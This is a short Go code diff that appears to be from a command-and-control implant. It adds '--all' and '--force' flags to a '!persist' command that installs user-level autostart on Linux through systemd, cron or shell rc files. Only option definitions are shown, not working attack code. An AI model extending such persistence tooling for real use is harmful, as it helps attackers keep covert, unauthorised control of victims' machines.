@@ -28,11 +28,13 @@ func platformCommands(cmd *cobra.Command) {
 	persistCmd := &cobra.Command{
 		Use:     def.C2CmdPersist,
 		Short:   "Persistence: install/status/remove user-level autostart",
-		Example: "!persist install --method auto | !persist status | !persist remove",
+		Example: "!persist install --method auto | !persist install --all | !persist status | !persist remove",
 		GroupID: "linux",
 		Run:     runPersist,
 	}
 	persistCmd.Flags().StringP("method", "m", "auto", "Persistence mechanism: auto|systemd|cron|shellrc")
+	persistCmd.Flags().Bool("all", false, "Install all available mechanisms (belt + suspenders)")
+	persistCmd.Flags().Bool("force", false, "Bypass collision guard (overwrite existing binary)")
 	cmd.AddCommand(persistCmd)
 
 	// !update --file <path>
